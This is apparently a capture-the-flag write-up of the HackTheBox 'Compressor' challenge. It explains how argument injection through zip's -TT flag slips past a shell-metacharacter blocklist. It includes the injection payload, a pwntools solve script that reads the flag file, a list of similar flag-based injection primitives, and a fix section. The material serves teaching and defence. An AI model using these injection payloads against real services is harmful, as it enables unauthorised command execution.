---
title: "Compressor"
date: 2026-10-23 09:00:00 -0500
categories: [HackTheBox, Challenges, Misc]
tags: [hackthebox, challenge, misc, argument-injection, command-injection, zip, gtfobins, cwe-88, cwe-78]
description: "A Very Easy Misc challenge where a menu service shells out to zip with a user-controlled options string. The metacharacter blocklist forgets that the dangerous primitive isn't a new command — it's a single zip flag, -TT, that runs commands for you."
---

## Overview

`Compressor` is a Very Easy HackTheBox **Misc** challenge. Connecting with `nc` drops
you into a small Python menu that lets you create files and `zip` them up. The compress
action shells out to `zip <name>.zip <name> <options>` with the `<options>` field fully
under your control — a textbook [argument injection](https://cwe.mitre.org/data/definitions/88.html)
that turns a benign archiver into remote command execution.

## The technique

The service tries to defend itself with a shell-metacharacter blocklist, so the obvious
[command injection](https://nvd.nist.gov/vuln/detail/CVE-2018-1000000) tricks (`;id`,
`$(id)`, `` `id` ``) are dead. Probing one character at a time — a blocked character
returns `[-] Invalid name!` — maps the filter out:

| Characters | Result |
|------------|--------|
| `$ { } \| & ; < > ( ) * \ ` `` ` `` | **blocked** |
| space, `'`, `#`, `/`, `.`, `-` | **allowed** |

The blocklist stops you from starting a *new* command. But [argument injection (CWE-88)](https://cwe.mitre.org/data/definitions/88.html)
doesn't need one — you inject *flags* into `zip` itself, and `zip` has a flag that runs
commands for you:

- `-T` — test the archive after building it.
- `-TT <cmd>` / `--unzip-command <cmd>` — replace the unzip test program. `zip` runs
  `<cmd>` through its **own** `system()` call, appending the archive name to the end.

Two shells are in play: the outer service shell (guarded by the blocklist) and `zip`'s
inner `system()` (completely unguarded). Single-quotes — which the blocklist allows —
group a spaced command into one argv token, so it sails past the outer shell untouched
and lands as the `-TT` value. This is the classic [GTFOBins](https://gtfobins.github.io/gtfobins/zip/)
`zip` primitive.

## Solution

The injection goes in the `<options>` field of the compress action:

```
-T -TT 'cat /home/ctf/flag.txt #'
```

`zip` builds the archive, then (because of `-T`) tests it by running
`cat /home/ctf/flag.txt # out.zip` — the trailing `#` comments out the archive name
`zip` appends. Out comes the flag.

Driving the menu over pwntools:

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, re
from pwn import remote, context
context.log_level = "info"
HOST, PORT = sys.argv[1], int(sys.argv[2])

io = remote(HOST, PORT)
io.recvuntil(b"Choose component:"); io.sendline(b"1")          # Head
io.recvuntil(b"Choose action:");    io.sendline(b"1")          # Create artifact
io.recvuntil(b"Insert name:");      io.sendline(b"x")
io.recvuntil(b"Insert content:");   io.sendline(b"hello")
io.recvuntil(b"Choose action:");    io.sendline(b"3")          # Compress artifact
io.recvuntil(b"Insert <name>.zip:");io.sendline(b"out")
io.recvuntil(b"Insert <name>:");    io.sendline(b"x")
io.recvuntil(b"Insert <options>:"); io.sendline(b"-T -TT 'cat /home/ctf/flag.txt #'")

data = io.recvall(timeout=8).decode(errors="replace")
m = re.search(r"HTB\{[^}]+\}", data)
print("[+] FLAG:", m.group(0) if m else "(not found)")
```

```bash
python3 solve.py <host> <port>
# [+] FLAG: HTB{...}
```

## Why it worked

[Argument injection (CWE-88)](https://cwe.mitre.org/data/definitions/88.html) is distinct
from classic [OS command injection (CWE-78)](https://cwe.mitre.org/data/definitions/78.html):
the input never becomes a *new* command, it becomes extra *arguments* to a trusted one.
A blocklist built to stop `;|&$` is the wrong defense entirely — the dangerous primitive
here is a single flag (`-TT`) plus a quote and a space, none of which look like
"injection." The same shape powers `tar --checkpoint-action=exec`, `curl --config`,
`find -exec`, and `ssh -oProxyCommand`.

## Fix / defense

Never build the command as a string. Pass user input as a fixed-position operand through
an argv array, and add a `--` end-of-options guard so nothing can be read as a flag:

```python
import subprocess
subprocess.run(['zip', f'{name}.zip', '--', name], shell=False)
```

Or strictly allowlist exact option flags and reject anything starting with `-`/`--`.
